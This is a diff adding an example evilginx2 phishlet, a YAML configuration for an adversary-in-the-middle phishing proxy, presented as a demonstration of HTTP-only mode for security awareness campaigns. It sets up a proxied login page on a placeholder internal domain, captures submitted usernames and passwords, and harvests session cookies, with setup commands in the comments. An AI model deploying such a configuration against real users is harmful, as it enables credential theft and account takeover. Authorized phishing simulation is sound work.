@@ -1,0 +1,89 @@
+# Example phishlet demonstrating HTTP support for security awareness campaigns
+#
+# HTTP SUPPORT FEATURES:
+# ======================
+#
+# This phishlet demonstrates evilginx2's HTTP support features designed for
+# security awareness campaigns where HTTPS is not required.
+#
+# KEY FEATURES:
+#
+# 1. HTTP-Only Phishing Server (http_mode):
+#    - Run the phishing server on HTTP without requiring TLS certificates
+#    - Enable with: phishlets http_mode <phishlet_name> on
+#    - Useful for internal awareness campaigns or testing environments
+#    - Server listens on http_port (default: 80, configurable via config http_port)
+#
+# 2. HTTP Origin Server Support (orig_scheme):
+#    - Proxy to HTTP targets instead of HTTPS
+#    - Set orig_scheme: 'http' in proxy_hosts
+#    - Allows: HTTPS phishing server -> HTTP target (default)
+#    - Allows: HTTP phishing server -> HTTP target (when http_mode enabled)
+#
+# USAGE SCENARIOS:
+#
+# Scenario A: HTTP phishing server -> HTTP target
+#   1. Enable http_mode: phishlets http_mode example-http on
+#   2. Set hostname: phishlets hostname example-http phish.internal.corp
+#   3. Enable: phishlets enable example-http
+#   4. Lure URL will be: http://phish.internal.corp/...
+#
+# Scenario B: HTTPS phishing server -> HTTP target
+#   1. Keep http_mode off (default)
+#   2. Configure normal hostname and enable
+#   3. Set orig_scheme: 'http' in proxy_hosts (as shown below)
+#   4. Evilginx will proxy HTTPS requests to HTTP origin
+#
+# CONFIGURATION COMMANDS:
+#   config http_port <port>           - Set HTTP listener port (default: 80)
+#   phishlets http_mode <name> on     - Enable HTTP mode for phishlet
+#   phishlets http_mode <name> off    - Disable HTTP mode (use HTTPS)
+#
+min_ver: '3.0.0'
+
+# proxy_hosts configuration with orig_scheme
+# orig_scheme: 'http' - Connect to origin server over HTTP (no TLS)
+# orig_scheme: 'https' - Connect to origin server over HTTPS (default)
+proxy_hosts:
+  - phish_sub: 'app'
+    orig_sub: 'app'
+    domain: 'internal-corp.local'
+    session: true
+    is_landing: true
+    auto_filter: true
+    orig_scheme: 'http'  # Connect to http://app.internal-corp.local
+
+  # Example with HTTPS origin (default behavior if orig_scheme not specified)
+  # - phish_sub: 'secure'
+  #   orig_sub: 'secure'
+  #   domain: 'example.com'
+  #   session: false
+  #   is_landing: false
+  #   auto_filter: true
+  #   orig_scheme: 'https'
+
+sub_filters:
+  - triggers_on: 'internal-corp.local'
+    orig_sub: 'app'
+    domain: 'internal-corp.local'
+    search: 'internal-corp.local'
+    replace: '{hostname}'
+    mimes: ['text/html', 'application/javascript']
+
+auth_tokens:
+  - domain: '.app.internal-corp.local'
+    keys: ['sessionid', 'auth_token']
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'app.internal-corp.local'
+  path: '/login'
